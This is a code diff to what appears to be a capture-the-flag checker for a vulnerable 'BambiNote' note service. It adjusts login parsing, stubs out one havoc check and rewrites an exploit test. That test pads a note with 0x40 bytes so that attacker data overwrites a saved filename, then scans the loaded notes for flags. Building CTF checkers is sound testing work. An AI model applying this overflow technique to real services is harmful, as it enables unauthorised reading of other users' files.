@@ -150,8 +150,12 @@ class BambiNoteClient():
         assert_equals(line, b"Username:\n> ", "Login Failed!")
         await self.write(username.encode() + b"\n")
         
-        line = await self.readuntil(b"> ")
-        assert_equals(line, b"Password:\n> ", "Login Failed!")
+        line = await self.readline()
+        try:
+            assert_equals(line, b"Password:\n", "Login Failed!")
+        except:
+            raise InvalidCredentialsException
+        await self.readuntil(b"> ")
         await self.write(password.encode() + b"\n")
         
         line = await self.readline()
@@ -355,9 +359,9 @@ async def havoc0(task: HavocCheckerTaskMessage, logger: LoggerAdapter):
 ## Delete Note
 @checker.havoc(1)
 async def havoc1(task: HavocCheckerTaskMessage, logger: LoggerAdapter):
-    async with BambiNoteClient(task, logger) as client:
-        await client.login()
-        
+    # async with BambiNoteClient(task, logger) as client:
+    #     await client.login()
+    pass
 
 # 1337
 @checker.havoc(2)
@@ -375,18 +379,22 @@ async def exploit_test(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, 
     username, password = generate_creds()
     async with BambiNoteClient(task, logger) as client:
         await client.register(username, password)
-        await client.create_note(5, b"A" * 0x50 + task.attack_info)
+        await client.create_note(5, b"A" * 0x40 + task.attack_info.encode())
         await client.save_note(5, "exploit_123")
         await client.load_note(0, "exploit_123")
+
+        client.state = (task.attack_info, client.state[1])
         notes = await client.list_notes()
 
         note_ctr = 1
         for note in notes['saved']:
-            if note == "." or note == "..":
+            if note == b"." or note == b"..":
                 continue
             
-            await note.load_note(note_ctr, note)
+            logger.info(f"loading NOTE {note_ctr}, filename: {note}")
+            await client.load_note(note_ctr, note.decode())
             notes = await client.list_notes()
+            logger.info(f"{notes}")
             foo = searcher.search_flag(notes[1]) 
             if foo is not None:
                 return foo
